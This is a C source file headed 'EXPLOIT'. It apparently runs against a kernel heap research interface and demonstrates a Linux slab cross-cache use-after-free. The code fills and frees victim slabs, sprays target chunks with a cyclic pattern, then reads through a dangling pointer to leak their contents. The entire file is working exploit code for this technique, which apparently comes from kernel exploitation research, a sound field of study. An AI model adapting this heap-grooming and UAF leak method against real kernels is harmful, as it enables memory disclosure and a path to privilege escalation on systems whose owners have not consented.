#include "libs/pwn.h"
#include <stdlib.h>
#include <string.h>
#include <strings.h>


/*******************************
 * EXPLOIT                     *
 *******************************/

#define CC_OVERFLOW_FACTOR 5

#define VICTIM_CHUNKS(cur) (cur->objs_per_slab*(cur->cpu_partial+1)*CC_OVERFLOW_FACTOR)

#define TARGET_SIZE 0x100
#define TARGET_CHUNKS 0x800

int main(int argc, char *argv[]) {
  char *buf = cyclic(TARGET_SIZE);
  size_t generic_cache_size;
  void *victim_ptr;
  void *target_chunks[TARGET_CHUNKS] = {0};

  generic_cache_size = argc < 2 ? 16 : strtol(argv[1], 0, 10);
  CHK(generic_cache_size <= 256);
  set_current_slab_info(generic_cache_size);

  char leak[cur->size];
  bzero(leak, sizeof(leak));
  void *victim_chunks[VICTIM_CHUNKS(cur)];

  lstage("INIT");

  init();
  pin_cpu(0, 0);

  lstage("START");

  linfo("fill old victim slabs");
  // fill at least on slab
  for(int i = 0; i < VICTIM_CHUNKS(cur); ++i) {
    victim_chunks[i] = keap_malloc(cur->size, GFP_KERNEL_ACCOUNT);
    // clear victim chunks
    keap_write(victim_chunks[i], leak, cur->size);
    if (i == (VICTIM_CHUNKS(cur) / 8)*7)
      victim_ptr = victim_chunks[i];
  }

  // free slab in order to get cross cache
  linfo("free victim slabs");
  for(int i = 0; i < VICTIM_CHUNKS(cur); ++i) {
    keap_free(victim_chunks[i]);
  }

  linfo("fill target slabs");
  for(int i = 0; i < TARGET_CHUNKS; ++i) {
    target_chunks[i] = keap_malloc(TARGET_SIZE, GFP_KERNEL);
    keap_write(target_chunks[i], buf, TARGET_SIZE);
  }

  linfo("uaf and cross-cache leak");
  // UAF in victim ptr leak
  keap_read(victim_ptr, leak, cur->size-1);
  linfo("leak: %.8s", leak);

  for(int i = 0; i < TARGET_CHUNKS; ++i) {
    keap_free(target_chunks[i]);
  }

  free(buf);

  return strcmp("", leak) == 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
